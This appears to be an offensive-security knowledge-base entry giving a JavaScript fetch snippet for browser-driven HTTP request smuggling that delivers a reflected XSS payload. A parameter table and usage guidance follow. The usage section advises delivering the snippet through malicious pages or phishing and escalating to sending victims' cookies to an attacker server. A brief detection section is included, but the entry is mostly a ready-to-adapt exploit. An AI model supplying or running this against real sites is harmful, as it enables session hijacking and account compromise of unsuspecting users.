---
id: 46413c3e-f1c2-44e6-b9f4-b55f6967c8c1-rewritten
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - request-smuggling
  - xss
  - http-desync
platforms:
  - web
  - browser
validated: true
---

# JavaScript Fetch Request Smuggling for XSS

## Code

```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
        location = 'https://www.example.com/'
})
```

## Description

This JavaScript code uses the Fetch API to perform an HTTP request smuggling attack from the browser, smuggling a GET request with an XSS payload inside a POST body. The HEAD prefix causes the proxy to consume only part of the body, while the server treats the remainder as a new request, leading to reflected XSS execution in the target domain's context. It includes credentials to maintain session and uses CORS mode to handle redirects without following them automatically.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| TARGET_URL | The vulnerable endpoint URL for the POST request | `https://www.example.com/redirect` |
| SMUGGLED_PATH | Path for the HEAD prefix to trigger desync | `/404/` |
| HOST | Target host header | `www.example.com` |
| XSS_PAYLOAD | The malicious script in the smuggled GET query | `<script>alert(1)</script>` |
| REDIRECT_URL | Fallback redirect after catch | `https://www.example.com/` |

## Usage

Execute this code in the browser console while authenticated to the target site, or deliver via a malicious page/phishing. Substitute parameters with target-specific values. Start with a benign payload to test desync, then escalate to data exfiltration (e.g., `document.cookie` sent to attacker server). Used in procedures like [[procedures/Exploit-Client-Side-Desynchronization-via-HTTP-Request-Smuggling]] for bypassing WAFs.

## Detection

- Browser logs showing CORS errors or unexpected fetch failures.
- WAF/Proxy logs with mismatched Content-Length/Transfer-Encoding headers.
- Network monitoring for smuggled requests (e.g., HEAD followed by GET in single TCP stream).
- CSP violations or XSS alerts if payload partially blocked.

## Related

- [[procedures/Exploit-Client-Side-Desynchronization-via-HTTP-Request-Smuggling]]
